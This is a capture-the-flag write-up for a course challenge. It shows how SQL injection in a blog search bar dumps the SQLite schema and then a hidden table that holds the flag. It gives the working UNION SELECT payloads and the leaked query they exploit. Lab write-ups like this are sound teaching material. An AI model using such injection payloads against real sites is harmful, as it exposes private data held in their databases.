# Challenge `Wow, it can't be more juicy than this!` writeup

- Vulnerability: What type of vulnerability is being exploited
  - SQL injection
- Where: Where is the vulnerability present
  - `http://ssof2526.challenges.cwte.me:25261` in the search bar.
- Impact: What results of exploiting this vulnerability
  - Allows any user to access information in the database.

## Steps to reproduce

1. In the search bar enter the following payload: `'UNION SELECT null, tbl_name, sql FROM sqlite_master WHERE type = 'table';--`.
2. This will display a list of all the tables in the database and the SQL information used to create them. From this list, we can see a table named `secret_blog_post` that contains columns named `id`, `title` and `content`.
3. Next, we can extract the contents of the `secret_blog_post` table by entering the following payload in the search bar: `'UNION SELECT id, title, content FROM secret_blog_post;--`.
4. This will display the contents of the `secret_blog_post` table, which contains a blog post named 'Reminder' and the flag in it's content.

Note: If you try to search the following: `'a`, you will be redirected to an error page where you can see the SQL query used in the search funtion. The query is the following: `SELECT id, title, content FROM blog_post WHERE title LIKE '%<search_content>%' OR content LIKE '%<search_content>%'`. If you replace `<search_content>` with `'UNION SELECT null, tbl_name, sql FROM sqlite_master WHERE type = 'table';--` the performed query will be: `SELECT id, title, content FROM blog_post WHERE title LIKE '%' UNION SELECT null, tbl_name, sql FROM sqlite_master WHERE type = 'table';--` since `--` comments the rest of the query. This will display all the tables in the database (and all the blogposts) and the SQL text that describes them. After this, if you search the following: `'UNION SELECT id, title, content FROM secret_blog_post;--`, the performed query will be: `SELECT id, title, content FROM blog_post WHERE title LIKE '%' UNION SELECT id, title, content FROM secret_blog_post;--` which will display the contents of the `secret_blog_post` table (and all other blog posts).

[(POC)](wow_it_cant_be_more_juicy_than_this_poc.py)
